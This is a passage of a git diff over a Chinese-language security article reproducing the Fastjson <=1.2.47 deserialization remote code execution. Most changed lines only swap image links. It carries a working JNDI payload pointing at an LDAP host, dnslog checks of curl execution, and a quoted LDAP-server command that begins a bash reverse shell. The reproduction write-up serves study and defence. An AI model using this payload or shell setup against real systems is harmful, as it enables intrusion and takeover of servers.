 {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.112.146:8888/Object","autoCommit":true\}\}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaFCKQx6xib322sYJiatlu4ZatVaMficX8yRBc8VXAHTTM6rR2F2EsEKyicg/640?wx_fmt=jpeg)  
+![](../../.resource/remote/87d4a77d5c40cde27eab8b39eb97978810b2e7f67de59aff94c4e847b9494477.jpg)  
 
 4）到 dnslog.cn 上查看靶机是否执行了 curl 命令
 
 可以发现靶机成功执行了 curl 命令，说明存在 RCE 漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUaI2JI0TODT5y6icLDJ7BFnA7fftzBibMzh2VVbZWatzURRdNVTia8Ylsjg/640?wx_fmt=jpeg)
+![](../../.resource/remote/486bf26ac7cea91186fd8753a06279a3c693ba9bb031984ba2278e831fe8e338.jpg)
 
 **0x02 反弹 shell 及其他**
 
@@ -1012,7 +1012,7 @@ java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.112.146 8888 "bash=/bin/
 
 注意 JDK 的版本，基于不同方式的反序列化攻击有不同的限制，否则会使得攻击无效
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icfiaC2TEFqM7T31ciavUJGUamuicnZ6IkjtwcHjAzjVSGicgShcHY4jEEic02FFzhgeSQrK1QKnjTpOZw/640?wx_fmt=jpeg)
+![](../../.resource/remote/527683f5bd1ae6848e58f46a94a6f1ba17472ac9b59c1058fe6099dfedf2dbd7.jpg)
 
 IDEA 搭建 Fastjson 框架时有两种导入包的方式，一种是手动创建目录导入，一种是在 porn.xml 中插入代码，刷新自动导入，推荐后面一种
 
@@ -1033,9 +1033,9 @@ Fastjson<=1.2.47 反序列化漏洞复现
 
 Fastjson <=1.2.47 远程命令执行
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)
+![](../../.resource/remote/33f7cb5f70c2418864a2ab9c5ebdb737b442bc98d5a34c344981f472bf69c466.gif)
 
-![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序
+![](../../.resource/remote/241a5efdd3cb729f4507509cc08336272b9d313bf6f9b586027d6bbf4e5d3099.png) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序
 
   
 
@@ -1049,15 +1049,15 @@ Fastjson <=1.2.47 远程命令执行
 
   
 
-****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****
+****![](../../.resource/remote/1347c4eed374fe9bbfe38e3bb4209c6240c5b44ca7dab877fa596499b746684e.jpg)****
 
   
 
-[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQicaAF2AhFiartqpalE3cqyDGxViayXC2U7iaib3VUDur9XiaNHFkYmLr6o1j0HtlL1n8ooT76QfATWhw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486265&idx=1&sn=8a02ee0c67815bd4aede3515514f1048&chksm=ce1cf1a6f96b78b011faf0c5b9c8461dd78cd918f47ca871588ab87c9cbc5857fc85f32e875d&scene=21#wechat_redirect)
+[![](../../.resource/remote/194bcae220e83d933791c07bfe727b0ccda3db9aa4790079bc090f22d5f33704.jpg)](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486265&idx=1&sn=8a02ee0c67815bd4aede3515514f1048&chksm=ce1cf1a6f96b78b011faf0c5b9c8461dd78cd918f47ca871588ab87c9cbc5857fc85f32e875d&scene=21#wechat_redirect)
 
-[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3866DyjmI6hwvyvdAfleLZtAZk8QV44ry1J9MMbZia1iaTIjDQQSXk7PQic85Ww79KxenI7UoQoHxd2A/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486247&idx=1&sn=84e65d14aead191568965ca1a836aa44&scene=21#wechat_redirect)
+[![](../../.resource/remote/932216174a2b81f307f0731736f4138f86ffc2999726592024b8ff2dc7a4dd31.png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486247&idx=1&sn=84e65d14aead191568965ca1a836aa44&scene=21#wechat_redirect)
 
-[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38EG5ZKJFuVuWZXN8KzbaqSdzbZ1RZhDUpDm2I4bEaCnmaouF8DdzGMaibqSuslpwP0fdPMgiaUR5lg/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486234&idx=1&sn=ea27cfe569dadad4c9e8604ee324316f&scene=21#wechat_redirect)**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************
+[![](../../.resource/remote/066e224db5f945b3bc495f3424d0cc12079d489be600ff8518f84eb4f6b044c7.png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486234&idx=1&sn=ea27cfe569dadad4c9e8604ee324316f&scene=21#wechat_redirect)**************![](../../.resource/remote/9e6a809b9fdf5ef44cf7cd86b8e001b4411ee0bfd0f43b726a7d5f1d85e9c9a1.gif)**************
 
 ---
 
